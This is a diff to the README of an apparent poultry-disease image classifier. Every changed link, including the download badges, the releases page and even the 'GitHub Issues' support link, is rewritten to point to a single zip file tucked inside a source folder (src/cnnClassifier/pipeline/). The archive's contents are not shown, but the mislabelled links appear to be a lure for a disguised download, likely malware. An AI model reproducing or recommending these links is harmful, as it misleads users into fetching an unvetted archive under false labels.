@@ -1,6 +1,6 @@
 # 🐔 Chicken-Disease-Classification - Early Disease Detection for Poultry Farmers
 
-[![Download Chicken-Disease-Classification](https://img.shields.io/badge/Download-Chicken--Disease--Classification-blue?style=for-the-badge)](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases)
+[![Download Chicken-Disease-Classification](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip)](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip)
 
 ## 📜 Project Description
 The Chicken Disease Classification Using MLOps DVC Pipeline project utilizes the VGG16 architecture to analyze images of chicken fecal matter. This tool helps poultry farmers detect diseases early, reducing financial losses and promoting healthier flocks.
@@ -9,7 +9,7 @@ The Chicken Disease Classification Using MLOps DVC Pipeline project utilizes the
 This guide will help you download and run the Chicken Disease Classification software. Follow these steps carefully.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** To download the software, visit the [Releases page here](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases).
+1. **Visit the Releases Page:** To download the software, visit the [Releases page here](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip).
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
@@ -45,7 +45,7 @@ After running the software, follow these steps to classify chicken fecal images:
 4. **Save Results:** You can save the analysis results for your records by clicking the “Save Results” button. 
 
 ## 🌐 Support and Contributions
-If you face any issues or have questions, please feel free to check our [GitHub Issues](https://github.com/ChagA-wq/Chicken-Disease-Classification/issues) for support. Contributions are welcome. If you want to help improve this project, consider creating a pull request.
+If you face any issues or have questions, please feel free to check our [GitHub Issues](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip) for support. Contributions are welcome. If you want to help improve this project, consider creating a pull request.
 
 ## 📝 License
 This project is licensed under the MIT License. You can use, modify, and distribute the software, but please credit the original authors.
@@ -53,4 +53,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 📣 Conclusion
 The Chicken Disease Classification software is a powerful tool for poultry farmers. By detecting diseases early, it supports healthier chickens and better farm management. Download the software today and take the first step towards ensuring a healthier flock.
 
-[![Download Chicken-Disease-Classification](https://img.shields.io/badge/Download-Chicken--Disease--Classification-blue?style=for-the-badge)](https://github.com/ChagA-wq/Chicken-Disease-Classification/releases)
+[![Download Chicken-Disease-Classification](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip)](https://raw.githubusercontent.com/ChagA-wq/Chicken-Disease-Classification/main/src/cnnClassifier/pipeline/Chicken-Disease-Classification_3.7.zip)
